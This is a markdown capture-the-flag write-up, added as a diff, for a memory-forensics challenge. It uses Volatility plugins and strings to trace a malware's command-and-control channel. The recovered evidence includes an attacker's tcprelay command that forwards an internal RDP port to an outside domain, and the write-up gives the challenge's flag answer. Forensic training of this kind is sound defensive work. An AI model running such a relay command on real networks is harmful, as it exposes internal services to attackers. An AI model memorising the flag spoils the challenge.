@@ -1,0 +1,118 @@
+---
+tags: []
+---
+# Command & Control - level 4
+
+- **Description:** Berthier, thanks to this new information about the processes running on the workstation, it's clear that this malware is used to exfiltrate data. 
+Find out the ip of the internal server targeted by the hackers!
+The validation flag should have this format : IP:PORT
+- **Difficulty:** Medium
+
+---
+
+## 🔎 Solution
+To investigate the system's network activity, we began by using the `netscan` plugin, which enumerates active network connections. 
+Interestingly, the results showed only internal port communications - no external IP connections were identified, suggesting possible use of covert channels or redirection.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 netscan | grep "iexplore.exe"
+Volatility Foundation Volatility Framework 2.6
+0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe   
+0x1fbca1a0         UDPv4    127.0.0.1:60151                *:*                                   3044     iexplore.exe   2013-01-12 16:57:47 UTC+0000
+0x1fa21008         TCPv4    127.0.0.1:58785                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa3ea48         TCPv4    127.0.0.1:58808                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa41008         TCPv4    127.0.0.1:58797                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa468b0         TCPv4    127.0.0.1:58747                127.0.0.1:12080      CLOSED           3044     iexplore.exe   
+0x1fa5f3d8         TCPv4    127.0.0.1:58823                127.0.0.1:12080      CLOSED           3044     iexplore.exe   
+0x1fa78ac0         TCPv4    127.0.0.1:58806                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa80880         TCPv4    127.0.0.1:58781                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa83c98         TCPv4    127.0.0.1:58727                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fa859c0         TCPv4    127.0.0.1:58740                127.0.0.1:12080      CLOSED           3044     iexplore.exe   
+0x1fa9a678         TCPv4    127.0.0.1:58787                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1faa97f8         TCPv4    127.0.0.1:58742                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fab2008         TCPv4    127.0.0.1:58791                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fad2988         TCPv4    127.0.0.1:58749                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fada310         TCPv4    127.0.0.1:58733                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fae1ba0         TCPv4    127.0.0.1:58815                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1faeddf8         TCPv4    127.0.0.1:58811                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1faf7c58         TCPv4    127.0.0.1:58783                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fafe208         TCPv4    127.0.0.1:58738                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fb80df8         TCPv4    127.0.0.1:58792                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fca0820         TCPv4    127.0.0.1:58729                127.0.0.1:12080      CLOSED           3044     iexplore.exe   
+0x1fd57da0         TCPv4    127.0.0.1:58795                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fd92378         TCPv4    127.0.0.1:58817                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fd9b580         TCPv4    127.0.0.1:58731                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe   
+0x1fd9f838         TCPv4    127.0.0.1:58758                127.0.0.1:12080      ESTABLISHED      3044     iexplore.exe  
+```
+
+We extended our analysis by leveraging the `consoles` plugin to review the system's console history. 
+This revealed interactions involving the `conhost.exe` process. 
+```bash
+ConsoleProcess: conhost.exe Pid: 2168
+Console: 0x1081c0 CommandHistorySize: 50
+HistoryBufferCount: 3 HistoryBufferMax: 4
+OriginalTitle: %SystemRoot%\system32\cmd.exe
+Title: C:\Windows\system32\cmd.exe
+AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
+----
+CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x0
+----
+CommandHistory: 0x427890 Application: whoami.exe Flags: 
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x0
+----
+CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x64
+----
+```
+
+Specifically, we observed that `conhost.exe` had executed the following:
+- `tcprelay.exe`: A known utility for redirecting and spoofing TCP connections, often leveraged in network-based attacks for port forwarding or establishing reverse shells.
+- `whoami.exe`: Likely used to confirm the privileges of the current session.
+- `cmd.exe`: Notably marked as **Allocated**, indicating it is still active in memory.
+
+These findings suggest that an attacker may have used `cmd.exe` to execute `tcprelay.exe` for TCP port forwarding, followed by `whoami.exe` to verify shell activity and user privileges.  
+
+Since `conhost.exe` handles console input/output, it likely processed these commands. 
+To dig deeper, we performed a memory dump of the `conhost.exe` process using the `memdump` plugin, resulting in the file `2168.dmp`.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 --dump-dir=./root-me 
+Volatility Foundation Volatility Framework 2.6
+************************************************************************
+Writing conhost.exe [  2168] to 2168.dmp
+```
+
+Finally, we analyzed the dump using `strings` and searched for occurrences of **tcprelay**. 
+This yielded critical information, including the target IP address and port used by the attacker.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ strings ./root-me/2168.dmp | grep "tcprelay.exe"     
+tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
+C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
+C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
+5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
+```
+
+## 🚩Flag
+> `192.168.0.22:3389`
+
+
+                                                                                                                                      
+ 
+                                                                                                                                     
+
+
+                                                                                                                                     
+
+                                                                                                                                     
+
